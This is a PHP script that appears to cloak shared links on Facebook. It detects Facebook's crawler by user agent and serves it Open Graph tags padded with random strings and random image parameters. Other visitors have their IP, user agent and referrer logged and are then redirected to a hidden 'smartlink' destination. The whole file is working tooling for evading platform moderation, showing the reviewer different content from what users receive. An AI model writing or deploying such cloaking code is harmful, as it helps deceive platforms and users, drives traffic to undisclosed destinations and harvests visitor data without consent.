<?php
require_once 'mobile_protection.php';

function generateRandomString($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $str = '';
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $str;
}

$fbAppId = '1604020986967005'; // Your Facebook App ID

$botImages = [
    'https://chatdatlng.biz.id/images/white1.jpg',
    'https://chatdatlng.biz.id/images/white2.jpg',
    'https://chatdatlng.biz.id/images/white3.jpg',
    'https://chatdatlng.biz.id/images/white4.jpg',
    'https://chatdatlng.biz.id/images/white5.jpg'
];

$token = $_GET['token'] ?? '';

if (!$token) {
    http_response_code(404);
    echo 'Invalid link';
    exit;
}

$links = json_decode(file_get_contents(__DIR__ . '/links.json'), true) ?? [];
$linkData = null;
foreach ($links as $link) {
    if ($link['token'] === $token) {
        $linkData = $link;
        break;
    }
}

if (!$linkData) {
    http_response_code(404);
    echo 'Link not found';
    exit;
}

function isFacebookBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $fbBots = ['facebookexternalhit', 'Facebot', 'Facebook'];

    foreach ($fbBots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (isFacebookBot()) {
    $title = htmlspecialchars($linkData['og']['title'] ?? '') . ' ' . generateRandomString();
    $description = htmlspecialchars($linkData['og']['description'] ?? '') . ' ' . generateRandomString();
    $image = $botImages[array_rand($botImages)] . '?v=' . generateRandomString(6);
    $url = htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    header('Content-Type: text/html; charset=utf-8');
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>{$title}</title>
    <meta property="fb:app_id" content="{$fbAppId}" />
    <meta property="og:title" content="{$title}" />
    <meta property="og:description" content="{$description}" />
    <meta property="og:image" content="{$image}" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:url" content="{$url}" />
    <meta property="og:type" content="website" />
</head>
<body>
    <div style="display:none;">{$description}</div>
</body>
</html>
HTML;
    exit;
}

$protection = new AdvancedMobileProtection();
$finalUrl = $protection->process($linkData['smartlink']);

$clicks = json_decode(file_get_contents(__DIR__ . '/clicks.json'), true) ?? [];
$clicks[] = [
    'token' => $token,
    'timestamp' => time(),
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'referrer' => $_SERVER['HTTP_REFERER'] ?? ''
];
file_put_contents(__DIR__ . '/clicks.json', json_encode($clicks, JSON_PRETTY_PRINT));

header('Location: ' . $finalUrl);
exit;
?>
